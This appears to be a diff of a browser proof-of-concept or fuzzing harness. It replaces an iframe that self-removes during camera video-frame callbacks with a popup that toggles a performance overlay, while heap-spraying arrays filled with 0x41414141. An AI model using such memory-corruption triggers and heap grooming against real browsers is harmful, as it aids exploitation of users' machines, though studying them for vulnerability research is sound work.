@@ -7,38 +7,28 @@
             console.log("Starting test...");
             for (let i = 0; i < 10; i++) {
                 try {
-                    let frame = document.createElement("iframe");
-                    frame.srcdoc = `
-                        <video id="video" autoplay playsinline></video>
+                    let win = window.open("", "_blank");
+                    win.document.write(`
                         <script>
-                            async function start() {
-                                try {
-                                    let stream = await navigator.mediaDevices.getUserMedia({video: { width: 640, height: 480 } });
-                                    let video = document.getElementById("video");
-                                    video.srcObject = stream;
-                                    await video.play();
-                                    video.requestVideoFrameCallback(() => {});
-                                    video.requestVideoFrameCallback(() => {
-                                        parent.document.getElementById("frame").remove();
-                                    });
-                                    video.requestVideoFrameCallback(() => {});
-                                    video.requestVideoFrameCallback(() => {});
-                                } catch (e) {
-                                    parent.console.log("Error in iframe:", e);
-                                }
+                            try {
+                                window.performance = window.performance || {};
+                                performance.setResourceUsageOverlayVisible = performance.setResourceUsageOverlayVisible || function(visible) {
+                                    console.log("Tried to set overlay visible: " + visible);
+                                };
+                                performance.setResourceUsageOverlayVisible(true);
+                                setTimeout(() => window.close(), 100);
+                            } catch (e) {
+                                console.log("Error in window:", e);
                             }
-                            start();
                         </script>
-                    `;
-                    frame.id = "frame";
-                    document.body.appendChild(frame);
-                    await new Promise(resolve => setTimeout(resolve, 1000));
-                    frame.remove();
-                    spray.push({ ptr: new Array(128).fill(0x41414141), data: "test" });
+                    `);
+                    await new Promise(resolve => setTimeout(resolve, 200));
+                    win.close();
+                    spray.push({ ptr: new Array(64).fill(0x41414141), data: new Array(64).fill("test") });
                 } catch (e) {
                     console.log("Error:", e);
                 }
-                let largeObject = new Array(500000).fill(0);
+                let largeObject = new Array(250000).fill(0);
                 largeObject = null;
             }
             spray = null;
